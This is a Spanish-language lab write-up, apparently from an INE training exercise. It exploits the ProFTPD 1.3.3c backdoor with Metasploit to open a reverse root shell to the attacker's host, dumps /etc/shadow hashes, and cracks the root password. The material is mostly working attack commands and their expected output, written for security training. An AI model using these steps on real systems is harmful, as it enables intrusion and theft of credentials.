# 🔐 Linux: Volcado y Descifrado de Contraseñas (Hashdump + Crack)

## 🎯 Objetivo

Aprovechar el acceso **root** obtenido en un servidor Linux mediante la explotación de ProFTPD 1.3.3c (u otro método) para volcar los hashes de las cuentas del sistema desde `/etc/shadow` y, posteriormente, descifrar la contraseña del superusuario con los módulos de Metasploit. La bandera del laboratorio es la propia contraseña en texto claro.

---

## 🔍 1. Enumeración y acceso inicial

### 📡 Verificar conectividad

```bash
ping -c 4 demo.ine.local
```

### 🔎 Escaneo de servicios

```bash
nmap -sS -sV demo.ine.local
```

**Salida esperada (fragmento relevante):**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
```
Se identifica **ProFTPD 1.3.3c**, una versión con puerta trasera.

### 🧪 Confirmación de la vulnerabilidad

```bash
nmap --script vuln -p 21 demo.ine.local
```

**Resultado:**
```
PORT   STATE SERVICE
21/tcp open  ftp
| vuln:
|   proftpd-backdoor:
|     VULNERABLE:
|     ProFTPD 1.3.3c Backdoor
|     State: VULNERABLE
```
✅ La puerta trasera está presente.

---

## 🚀 2. Explotación de la puerta trasera de ProFTPD

### 🗄️ Iniciar la base de datos de Metasploit

```bash
/etc/init.d/postgresql start
```

### 🖥️ Cargar el módulo y configurar

```bash
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
```

| Opción     | Valor               | Descripción |
|------------|---------------------|-------------|
| `payload`  | `cmd/unix/reverse`  | Shell reversa Unix genérica |
| `RHOSTS`   | IP del objetivo     | demo.ine.local |
| `LHOST`    | IP de Kali          | 192.70.114.2 (ajustar según la máquina) |

### 💣 Ejecutar y obtener shell

```bash
exploit -z
```

**Salida esperada:**
```
[*] Started reverse double handler on 192.70.114.2:4444
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (192.70.114.2:4444 -> 192.70.114.3:6200)
```
Se obtiene una shell como **root** (UID 0).

---

## 🗄️ 3. Volcado de los hashes del sistema

Con la sesión en segundo plano, se ejecuta el módulo de post‑explotación `hashdump` para extraer el contenido de `/etc/shadow`.

```bash
use post/linux/gather/hashdump
set SESSION 1
exploit
```

**Resultado esperado:**
```
[+] root:$6$xxxx$yyyy...:0:0:root:/root:/bin/bash
[+] daemon:$6$...:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[+] ...
```
Los hashes comienzan por `$6$`, indicando que son **SHA‑512**.

---

## 🔓 4. Descifrado de la contraseña de root

Metasploit dispone de un módulo auxiliar específico para romper hashes de Linux.

```bash
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

| Opción    | Valor   | Significado |
|-----------|---------|-------------|
| `SHA512`  | `true`  | Indica que el hash a romper es SHA‑512 |

El módulo utiliza diccionarios internos y, si la contraseña es débil, la muestra en pantalla.

**Salida final:**
```
[+] root:password
```

🔑 La contraseña de root en texto claro es **`password`**.

---

## 🏁 5. Bandera del laboratorio

La bandera **es la misma contraseña descubierta**.

**Flag:** `password`

---

## 🧠 Resumen del ataque

| Fase | Módulo / Comando | Propósito |
|------|------------------|-----------|
| 1 | `nmap --script vuln -p 21` | Confirmar ProFTPD 1.3.3c vulnerable |
| 2 | `exploit/unix/ftp/proftpd_133c_backdoor` | Obtener shell como root |
| 3 | `post/linux/gather/hashdump` | Extraer los hashes desde `/etc/shadow` |
| 4 | `auxiliary/analyze/crack_linux` (SHA512=true) | Romper el hash y revelar la contraseña |

El laboratorio demuestra que, una vez obtenido acceso root, la información sensible como las contraseñas de los usuarios puede ser extraída y, si no son robustas, descifrada en segundos con herramientas automatizadas.
